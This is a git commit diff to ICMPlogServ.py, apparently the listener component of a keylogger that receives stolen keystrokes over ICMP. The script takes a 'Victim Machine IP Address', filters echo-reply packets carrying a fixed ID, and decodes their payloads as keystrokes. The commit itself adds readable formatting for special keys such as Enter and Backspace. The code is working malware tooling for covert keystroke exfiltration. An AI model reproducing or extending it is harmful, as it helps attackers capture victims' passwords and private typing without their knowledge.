2f68d62fd72073c0eb22fd38f148c9131f5be34f
Krptyk <149233352+Krptyk@users.noreply.github.com>
2023-12-27 11:11:46 +1000

    Update ICMPlogServ.py

--- ICMPlogServ.py
+++ ICMPlogServ.py
@@ -7,18 +7,31 @@ ICMP_ID = int(13170)
 
 # Argument Parser
 parser = argparse.ArgumentParser()
-parser.add_argument('-i', '--interface', type=str, required=True, help="Listener (virtual) Network Interface (e.g. eth0)")
+parser.add_argument('-i', '--interface', type=str, required=True, help="Listener (virtual) Network Interface (e.g., eth0)")
 parser.add_argument('-d', '--destination_ip', type=str, required=True, help="Victim Machine IP Address")
 args = parser.parse_args()
 
 def format_key_data(key_data):
-    # Remove braces from special keys
+    # Dictionary of special keys for more readable output
+    special_keys = {
+        'space': ' ',
+        'enter': '\n',
+        'tab': '\t',
+        'backspace': '[BACKSPACE]',
+        'shift': '[SHIFT]',
+        'ctrl': '[CTRL]',
+        'alt': '[ALT]',
+        'esc': '[ESC]',
+        'delete': '[DEL]',
+        # Add more keys as needed
+    }
+
     if key_data.startswith('{') and key_data.endswith('}'):
-        return '[' + key_data[1:-1] + ']'
+        key_name = key_data[1:-1]
+        return special_keys.get(key_name, f'[{key_name.upper()}]')
     return key_data
 
 def shell(pkt):
-    # Check for the correct source IP, ICMP type, and ID
     if pkt[IP].src == args.destination_ip and pkt[ICMP].type == 0 and pkt[ICMP].id == ICMP_ID and Raw in pkt:
         key_data = pkt[Raw].load.decode('utf-8', errors='ignore')
         formatted_key_data = format_key_data(key_data)
